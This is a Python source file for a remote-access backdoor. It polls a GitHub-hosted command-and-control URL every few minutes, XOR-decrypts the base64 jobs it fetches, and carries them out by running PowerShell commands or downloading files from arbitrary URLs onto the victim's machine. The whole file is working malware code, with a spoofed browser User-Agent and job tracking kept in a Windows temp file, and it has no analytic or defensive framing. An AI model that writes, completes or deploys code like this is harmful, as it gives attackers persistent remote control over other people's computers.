import os
import json
import time
import base64
import getpass
import os
import subprocess
import urllib.request
import http.client

class Config:
    def __init__(self):
        self.c2url = 'https://raw.githubusercontent.com/xxxx/xxx/master/conf.cfg'
        self.delay = 240
        self.xor_key = 0xA
        self.os_user = ''
        self.latest_job_path = ''
        self.latest_job_id = ''
    
    def get_os_user_name(self):
        return str(getpass.getuser())

    def read_latest_job(self):
        try:
            fobj = open(self.latest_job_path,'r')
            jid = fobj.read()
            fobj.close()
            return jid
        except BaseException:
            return '0000000'

    def init_config(self):
        print('[+]Init config object')
        self.os_user = self.get_os_user_name()
        self.latest_job_path = 'C:\\Users\\' + self.os_user  + '\\AppData\\Local\\Temp\\MXJID0V1.tmp'
        self.latest_job_id = self.read_latest_job()

def decrypt_bytes(buf,xor_key):
    decrypted_bytes = b''
    for b in buf:
        x = b ^ xor_key
        decrypted_bytes = decrypted_bytes + x.to_bytes(1, byteorder='little', signed=True)
    return decrypted_bytes

def http_get(url,time_out=8):
    header = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'}
    req = urllib.request.Request(url,headers=header)
    try:   
        request = urllib.request.urlopen(req,timeout=time_out)
    except BaseException as e:
        return False
    return request.read()

def save_latest_job(config):
    print("[+]Save latest job")
    try:
        fobj = open(config.latest_job_path,'w')
        fobj.write(config.latest_job_id)
        fobj.close()
    except BaseException:
        pass

def job_execute(job_dic):
    commands_list = job_dic['commands']
    result = True
    for cmd in commands_list:
        try:
            cmd_type = cmd['type']
            par = base64.b64decode(cmd['par'].encode('utf-8')).decode('utf-8')
        except BaseException:
            return False
        bResult = execute_command(cmd_type,par)    
        result = result and bResult
    
    return 1

def get_job_loop(config):
    while True:
        time.sleep(config.delay)
        job_encrypted_b64 = http_get(config.c2url)
        print(job_encrypted_b64)
        if job_encrypted_b64 ==b'\n'  or job_encrypted_b64 == False:
            continue

        try:
            job_encrypted_bytes = base64.b64decode(job_encrypted_b64)
            job_json = decrypt_bytes(job_encrypted_bytes,config.xor_key).decode()
            job_dic = json.loads(job_json)
            print(job_dic)
        except BaseException as e:
            print(e)
            continue
        #should execute this job?
        if job_dic['id'] == config.latest_job_id:
            continue
        else:
            result = job_execute(job_dic)

        if result:
            #save job id 
            config.latest_job_id = job_dic['id']
            save_latest_job(config)
        else:
            print('[!]Execute this job failed')
            pass

def execute_command(cmd_type,par):
    print('[+]execute command: ' + cmd_type + '--' + par)
    if cmd_type == 'shell':
        r = shell_execute(par)
    if cmd_type == 'http_down':
        r = http_down_file(par)
    return r

###############################################
def shell_execute(shell_command):
    cmd = 'powershell.exe -c ' + shell_command
    res = subprocess.call(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    return True

def http_down_file(par):
    try:
        url = par.split(' ')[0]
        dest_path = par.split(' ')[1]
    except BaseException:
        return False

    try:
        urllib.request.urlretrieve(url, dest_path)
    except BaseException as e:
        print(e)
        return False
    print('http download file ok')
    return True
 

if __name__ == "__main__":
    print('start....')
    config = Config()
    config.init_config()
    print(config.latest_job_id)
    get_job_loop(config)